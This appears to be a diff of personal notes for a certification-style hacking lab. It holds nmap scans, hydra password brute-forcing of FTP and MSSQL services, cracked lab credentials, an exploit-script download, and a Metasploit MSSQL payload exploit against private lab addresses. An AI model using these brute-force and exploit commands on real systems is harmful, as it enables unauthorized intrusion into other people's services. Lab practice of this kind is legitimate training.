@@ -4,10 +4,8 @@
 # PART II - Challenge 1  💬ANSWER: https://www.crushftp.com/💬
 nmap -p 21 --open -iL ~/anotacoes/1_2.txt
 nmap -sV -p 21 192.168.10.144 192.168.10.222
-# nmap -sV -A -p 21 192.168.10.144 192.168.10.222
-# nmap -sV --script ftp-anon,ftp-bounce,ftp-syst -p 21 192.168.10.144 192.168.10.222
 find ~ -type f -iname 'passwords.txt'
-hydra -l nick -P ~/Desktop/password.txt ftp://192.168.10.111
+hydra -l nick -P ~/rockyou.txt 192.168.10.111 ftp
 ### INFO: [21] [ftp] host: 192.168.10.111 login: nick password: apple
 
 ftp 192.168.10.111 
@@ -18,6 +16,12 @@ ls  # CONECTADO VIA FTP
 get 52012.py
 exit
 grep www 52012.py
+
+# ⚠️ COMANDOS IMPORTANTES
+# nmap -sV -A -p 21 192.168.10.144 192.168.10.222
+# nmap -sV --script ftp-anon,ftp-bounce,ftp-syst -p 21 192.168.10.144 192.168.10.222
+# hydra -l nick -P ~/Desktop/password.txt 192.168.10.111 ftp
+# ftp ftp://nick:apple@192.168.10.111
 
 ## 🗒️ NOTES
 echo -e "https://www.crushftp.com\nUSER: nick\nPASS: apple" > ~/anotacoes/2_1.txt
@@ -150,12 +154,10 @@ john --wordlist=~/rockyou.txt hash_founded.txt
 
 # PART II - Challenge 8  💬ANSWER: 7💬
 hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.144 mssql -u -t 8 -w 5 
-# hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.144 mssql -u -V -t 8 
-# hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.144 mssql
+
 ### INFO: [1433] [mssql] host: 192.168.10.144 login: Server_mssrv password: Spidy
 find / -type f -name 'mssqlclient.py' 2>/dev/null
 mssqlclient.py Server_mssrv:Spidy@192.168.10.144 -port 1433
-# mssqlclient.py SKILL.CEH/Server_mssrv:Spidy@192.168.10.144 -port 1433
 msfconsole -q -x "
 search mssql;
 use exploit/windows/mssql/mssql_payload;
@@ -173,6 +175,10 @@ exploit;"
 dir 
 ### INFO: Name → MSS.txt, Size → 7
 
+# ⚠️ COMANDOS IMPORTANTES
+# hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.144 mssql -u -V -t 8 
+# hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.144 mssql
+# mssqlclient.py SKILL.CEH/Server_mssrv:Spidy@192.168.10.144 -port 1433
 
 #------------------------------#
 
